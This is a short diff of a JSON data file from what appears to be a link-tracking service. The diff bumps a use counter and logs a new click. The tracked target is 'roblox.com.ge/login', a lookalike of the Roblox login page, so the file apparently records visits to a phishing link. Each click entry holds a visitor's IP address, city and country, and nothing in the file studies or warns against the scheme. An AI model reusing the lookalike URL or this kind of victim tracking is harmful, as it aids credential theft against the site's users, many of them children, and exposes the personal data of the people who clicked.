@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1501,
+    "useCount": 1502,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12176,6 +12176,14 @@
         "city": "Dourgne",
         "flag": "🇫🇷",
         "countryCode": "FR"
+      },
+      {
+        "timestamp": 1777443763705,
+        "ip": "14.192.214.22",
+        "country": "Malaysia",
+        "city": "Kuala Lumpur",
+        "flag": "🇲🇾",
+        "countryCode": "MY"
       }
     ]
   },
